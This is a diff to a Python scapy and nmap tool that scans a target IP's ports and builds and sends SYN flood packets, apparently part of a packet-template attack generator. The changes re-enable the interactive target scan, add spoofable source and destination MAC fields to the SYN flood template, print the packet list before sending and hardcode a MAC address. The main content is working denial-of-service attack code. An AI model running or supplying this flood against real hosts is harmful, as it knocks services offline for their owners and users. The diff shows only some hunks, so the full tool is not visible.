@@ -1,4 +1,4 @@
-'''from scapy.all import *
+from scapy.all import *
 import nmap
 import re
 
@@ -31,7 +31,7 @@ og_source_mac_address = source_mac_address
 
 # Get Target IP Address
 while True:
-    target_ip = input("Enter host IP address: ")
+    target_ip = input("Enter target IP address: ")
     regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
     if(re.search(regex, target_ip.lower())):
         values["target_ip"]=target_ip
@@ -43,8 +43,15 @@ while True:
 nm = nmap.PortScanner()
 print("Getting target's information. Please wait...")
 nm.scan(target_ip, '0-1023')
-target_mac_address = str(nm[target_ip]['addresses']['mac'])
+target_mac_address = str(nm[target_ip]['addresses']['mac']).lower()
 values["target_mac_address"]=target_mac_address
+
+# For troubleshooting in case get target ports errors out
+print("Ports open")
+for port in nm[target_ip].all_udp():
+	state = nm[target_ip]['udp'][port]['state']
+	if state == 'open':
+		print(nm[target_ip]['udp'][port])
 
 # Get Target Ports
 tcp_ports = list(nm[target_ip]['tcp'].keys())
@@ -60,7 +67,7 @@ import random
 values = {}
 tcp_ports = [80, 22, 53]
 values["tcp_ports"]=tcp_ports
-target_mac_address = "ff:ff:ff:ff:ff:ff"
+target_mac_address = "00:0c:29:ac:a4:4a"
 values["target_mac_address"]=target_mac_address
 og_source_mac_address = "ff:ff:ff:ff:ff:ff"
 source_mac_address = "ff:ff:ff:ff:ff:ff"
@@ -71,23 +78,24 @@ values["source_ip"]=source_ip
 target_ip = "1.1.1.1"
 values["target_ip"]=target_ip
 values["quantity"]=100
-
+'''
 
 # TEMPLATES EXAMPLE   
 def syn_flood():
     print("SYN Flood")
-    valid_var = ["target_ip", "quantity"]
+    valid_var = ["source_mac_address", "target_mac_address", "target_ip", "quantity"]
     help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
     print("\nRunning SYN Flood attack, please enter the parameters:\n")
     variable_input(valid_var, help_statement)
     all_variables_inputted(valid_var)
     check_var(values, valid_var)
-    template = IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S")
+    template = (Ether(src=values.get("source_mac_address"), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
     ns = []
     pktAmt = int(values.get("quantity"))
     for pktNum in range(0,pktAmt):
     	ns.extend(template)
     	ns[pktNum][TCP].dport = random.choice(tcp_ports)
+    print(ns)
     send(ns)
     print("Packets sent")
 
@@ -249,7 +257,7 @@ def help_func(required_var_list):
         print("valid entries for query_type are A and PTR, you currently have the query_type value set as", values.get("query_type")) 
     if "query_name" in required_var_list:
         print("value is dependent on query type selected, you currently have the query_type value set as", values.get("query_name")) 
-        
+
 # Checks to see if all the required variables have been filled
 def all_variables_inputted(required_var_list):
     while all(variables in values for variables in required_var_list) is False:
@@ -291,5 +299,5 @@ while True:
     except KeyboardInterrupt:
         print("\nExiting program")
         sys.exit()
-    except:
-        print("\nInvalid input", data)
+    #except:
+        #print("\nInvalid input", data)
